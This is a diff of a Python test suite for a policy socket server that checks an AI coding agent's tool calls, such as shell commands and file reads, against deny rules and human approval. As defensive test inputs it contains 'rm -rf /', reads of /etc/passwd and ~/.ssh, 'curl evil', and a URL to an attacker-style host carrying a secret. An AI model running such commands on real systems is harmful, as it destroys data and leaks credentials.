@@ -23,17 +23,19 @@ from codeforge.claude_code_executor import (
     PolicySocketServer,
     build_cli_command,
     hook_timeouts,
-    policy_request_args,
     resolve_cli,
 )
 from codeforge.config import get_settings
 from codeforge.models import ToolCallDecision
-from codeforge.runtime import arguments_preview
 from codeforge.subprocess_env import tool_env
 
 if TYPE_CHECKING:
     from collections.abc import Iterator
     from pathlib import Path
+
+
+# Workspace of the socket server tests (need not exist: paths are resolved as far as they do).
+_WS = "/ws"
 
 
 def _make_executor() -> ClaudeCodeExecutor:
@@ -140,57 +142,38 @@ class TestEstimateEquivalentCost:
 # ---------------------------------------------------------------------------
 
 
-class TestPolicyRequestArgs:
-    """Claude Code's own tool names are sent; the Go policy layer maps them to canonical names."""
+class TestPolicyRequestMapping:
+    """The socket sends Claude Code's own tool names (Go maps them) with the shared mapping (codeforge.policy_args)."""
 
-    def test_read_sends_file_path(self) -> None:
-        assert policy_request_args("Read", {"file_path": "/tmp/foo.py"}) == (
-            "",
-            "/tmp/foo.py",
-            '{"file_path": "/tmp/foo.py"}',
-        )
+    async def test_paths_are_relative_to_the_workspace(self) -> None:
+        runtime = _FakeRuntime("allow")
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
+            await _ask(server, _request(server, "Read", {"file_path": f"{_WS}/src/a.py"}))
+            await _ask(server, _request(server, "Read", {"file_path": "/etc/passwd"}))
+            await _ask(server, _request(server, "Glob", {"pattern": "/home/worker/.ssh/*"}))
+            await _ask(server, _request(server, "Grep", {"pattern": "TODO"}))
 
-    def test_bash_sends_command(self) -> None:
-        assert policy_request_args("Bash", {"command": "rm -rf /", "description": "cleanup"}) == (
-            "rm -rf /",
-            "",
-            '{"command": "rm -rf /", "description": "cleanup"}',
-        )
+        assert [c["path"] for c in runtime.calls] == [
+            "src/a.py",
+            os.path.realpath("/etc/passwd"),
+            os.path.realpath("/home/worker/.ssh"),
+            ".",
+        ]
 
-    # Monitor runs a shell command like Bash (Go maps it to Bash), so the
-    # command deny lists must see its command.
-    def test_monitor_sends_command(self) -> None:
-        command, path, _ = policy_request_args("Monitor", {"command": "tail -f log", "description": "watch"})
-        assert (command, path) == ("tail -f log", "")
+    @pytest.mark.parametrize("tool", ["Bash", "Monitor"])
+    async def test_command_tools_send_their_command(self, tool: str) -> None:
+        runtime = _FakeRuntime("allow")
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
+            await _ask(server, _request(server, tool, {"command": "rm -rf /", "description": "cleanup"}))
 
-    def test_unknown_tool_command_is_not_evaluated(self) -> None:
-        # The arguments are shown to the approver, never evaluated.
-        assert policy_request_args("SomeNewTool", {"arg": "val", "command": "curl x"}) == (
-            "",
-            "",
-            '{"arg": "val", "command": "curl x"}',
-        )
-
-    @pytest.mark.parametrize(
-        ("tool", "tool_input", "expected_path"),
-        [
-            ("Edit", {"file_path": "/ws/.env", "old_string": "a", "new_string": "b"}, "/ws/.env"),
-            ("MultiEdit", {"file_path": "/ws/a.go", "edits": []}, "/ws/a.go"),
-            ("Write", {"file_path": "/ws/b.go", "content": "x"}, "/ws/b.go"),
-            ("NotebookEdit", {"notebook_path": "/ws/n.ipynb", "new_source": "x"}, "/ws/n.ipynb"),
-            ("Grep", {"pattern": "TODO", "path": "/ws/src"}, "/ws/src"),
-            ("Glob", {"pattern": "**/*.go"}, ""),
-            ("LS", {"path": "/ws"}, "/ws"),
-            ("Edit", {"file_path": 42}, ""),
-            ("Edit", {"file_path": ""}, ""),
-            ("Read", {"file_path": "../../etc/passwd"}, "../../etc/passwd"),
-        ],
-    )
-    def test_sends_path_argument(self, tool: str, tool_input: dict[str, object], expected_path: str) -> None:
-        assert policy_request_args(tool, tool_input) == ("", expected_path, arguments_preview(tool_input))
-
-    def test_bash_command_must_be_a_string(self) -> None:
-        assert policy_request_args("Bash", {"command": ["rm", "-rf", "/"]})[0] == ""
+        assert runtime.calls == [
+            {
+                "tool": tool,
+                "command": "rm -rf /",
+                "path": "",
+                "arguments_preview": '{"command": "rm -rf /", "description": "cleanup"}',
+            }
+        ]
 
 
 # ---------------------------------------------------------------------------
@@ -218,17 +201,17 @@ def _request(server: PolicySocketServer, tool_name: str, tool_input: dict[str, o
 class TestPolicySocketServer:
     async def test_allow(self) -> None:
         runtime = _FakeRuntime("allow", "matched rule 3")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, "Read", {"file_path": "/ws/a.py"}))
 
         assert reply == {"decision": "allow", "reason": "matched rule 3"}
         assert runtime.calls == [
-            {"tool": "Read", "command": "", "path": "/ws/a.py", "arguments_preview": '{"file_path": "/ws/a.py"}'},
+            {"tool": "Read", "command": "", "path": "a.py", "arguments_preview": '{"file_path": "/ws/a.py"}'},
         ]
 
     async def test_deny_passes_the_reason(self) -> None:
         runtime = _FakeRuntime("deny", "command matches command_deny")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, "Bash", {"command": "curl evil"}))
 
         assert reply == {"decision": "deny", "reason": "command matches command_deny"}
@@ -238,14 +221,14 @@ class TestPolicySocketServer:
     async def test_hitl_result_passes_through(self, decision: str, reason: str) -> None:
         # request_tool_call returns only once a human decided (Go waits for the approval).
         runtime = _FakeRuntime(decision, reason, delay=0.3)
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, "Write", {"file_path": "/ws/x", "content": "y"}))
 
         assert reply == {"decision": decision, "reason": reason}
 
     @pytest.mark.parametrize("decision", ["ask", "", "ALLOW", "unknown"])
     async def test_anything_but_allow_is_denied(self, decision: str) -> None:
-        async with PolicySocketServer(_FakeRuntime(decision), decision_timeout=5) as server:
+        async with PolicySocketServer(_FakeRuntime(decision), _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, "Bash", {"command": "ls"}))
 
         assert reply["decision"] == "deny"
@@ -253,7 +236,7 @@ class TestPolicySocketServer:
     @pytest.mark.parametrize("token", ["wrong", "x" * 43, "ééé"])
     async def test_wrong_token_is_denied(self, token: str) -> None:
         runtime = _FakeRuntime("allow")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, "Bash", {"command": "ls"}, token=token))
 
         assert reply["decision"] == "deny"
@@ -273,7 +256,7 @@ class TestPolicySocketServer:
     )
     async def test_malformed_request_is_denied(self, line: bytes) -> None:
         runtime = _FakeRuntime("allow")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, line)
 
         assert reply["decision"] == "deny"
@@ -285,7 +268,7 @@ class TestPolicySocketServer:
     )
     async def test_bad_tool_fields_are_denied(self, tool_name: object, tool_input: object) -> None:
         runtime = _FakeRuntime("allow")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             body = {"token": server.token, "tool_name": tool_name, "tool_input": tool_input}
             reply = await _ask(server, (json.dumps(body) + "\n").encode())
 
@@ -301,7 +284,7 @@ class TestPolicySocketServer:
     )
     async def test_unmapped_tool_is_denied_without_asking_go(self, tool_name: str) -> None:
         runtime = _FakeRuntime("allow")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, tool_name, {"url": "https://evil.example/?q=secret"}))
 
         assert reply["decision"] == "deny"
@@ -311,7 +294,7 @@ class TestPolicySocketServer:
     @pytest.mark.parametrize("tool_name", CLAUDE_CODE_TOOLS)
     async def test_mapped_tools_are_asked(self, tool_name: str) -> None:
         runtime = _FakeRuntime("allow")
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, tool_name, {}))
 
         assert reply["decision"] == "allow"
@@ -319,7 +302,7 @@ class TestPolicySocketServer:
 
     async def test_request_tool_call_raising_is_denied(self) -> None:
         runtime = _FakeRuntime(exc=RuntimeError("nats down"))
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             reply = await _ask(server, _request(server, "Bash", {"command": "ls"}))
 
         assert reply["decision"] == "deny"
@@ -327,7 +310,7 @@ class TestPolicySocketServer:
 
     async def test_slow_decision_is_denied_after_the_decision_timeout(self) -> None:
         runtime = _FakeRuntime("allow", delay=5)
-        async with PolicySocketServer(runtime, decision_timeout=0.2) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=0.2) as server:
             reply = await _ask(server, _request(server, "Bash", {"command": "ls"}))
 
         assert reply["decision"] == "deny"
@@ -335,7 +318,7 @@ class TestPolicySocketServer:
     async def test_oversized_request_is_denied(self) -> None:
         runtime = _FakeRuntime("allow")
         big: dict[str, object] = {"file_path": "/ws/big", "content": "x" * (cce.MAX_POLICY_REQUEST_BYTES + 10)}
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             # The server may answer "deny" or drop the connection mid-request; the hook blocks either way.
             try:
                 decision, _ = await asyncio.to_thread(
@@ -349,16 +332,16 @@ class TestPolicySocketServer:
 
     async def test_concurrent_requests(self) -> None:
         runtime = _FakeRuntime("allow", delay=0.2)
-        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=5) as server:
             replies = await asyncio.gather(
                 *(_ask(server, _request(server, "Read", {"file_path": f"/ws/{i}"})) for i in range(5))
             )
 
         assert [r["decision"] for r in replies] == ["allow"] * 5
-        assert sorted(c["path"] for c in runtime.calls) == [f"/ws/{i}" for i in range(5)]
+        assert sorted(c["path"] for c in runtime.calls) == [str(i) for i in range(5)]
 
     async def test_socket_is_private_and_removed_on_exit(self) -> None:
-        async with PolicySocketServer(_FakeRuntime(), decision_timeout=5) as server:
+        async with PolicySocketServer(_FakeRuntime(), _WS, decision_timeout=5) as server:
             path = server.socket_path
             directory = os.path.dirname(path)
             assert stat.S_IMODE(os.stat(directory).st_mode) == 0o700
@@ -370,8 +353,8 @@ class TestPolicySocketServer:
 
     async def test_each_run_gets_its_own_token_and_socket(self) -> None:
         async with (
-            PolicySocketServer(_FakeRuntime(), decision_timeout=5) as first,
-            PolicySocketServer(_FakeRuntime(), decision_timeout=5) as second,
+            PolicySocketServer(_FakeRuntime(), _WS, decision_timeout=5) as first,
+            PolicySocketServer(_FakeRuntime(), _WS, decision_timeout=5) as second,
         ):
             assert first.token != second.token
             assert first.socket_path != second.socket_path
@@ -379,7 +362,7 @@ class TestPolicySocketServer:
     async def test_exit_does_not_wait_for_a_pending_decision(self) -> None:
         runtime = _FakeRuntime("allow", delay=30)
         started = time.monotonic()
-        async with PolicySocketServer(runtime, decision_timeout=60) as server:
+        async with PolicySocketServer(runtime, _WS, decision_timeout=60) as server:
             _reader, writer = await asyncio.open_unix_connection(server.socket_path)
             writer.write(_request(server, "Bash", {"command": "ls"}))
             await writer.drain()
@@ -667,7 +650,7 @@ class TestRunWithFakeCli:
         assert result.error == ""
         assert [c["tool"] for c in runtime.calls] == ["Bash", "Read"]
         assert runtime.calls[0]["command"] == "echo pwned > marker"
-        assert runtime.calls[1]["path"] == str(tmp_path / "a.py")
+        assert runtime.calls[1]["path"] == "a.py"
         hooks = fake_cli.record["hooks"]
         assert [h["exit"] for h in hooks] == [2, 2]
         assert "blocked by policy" in hooks[0]["stderr"]
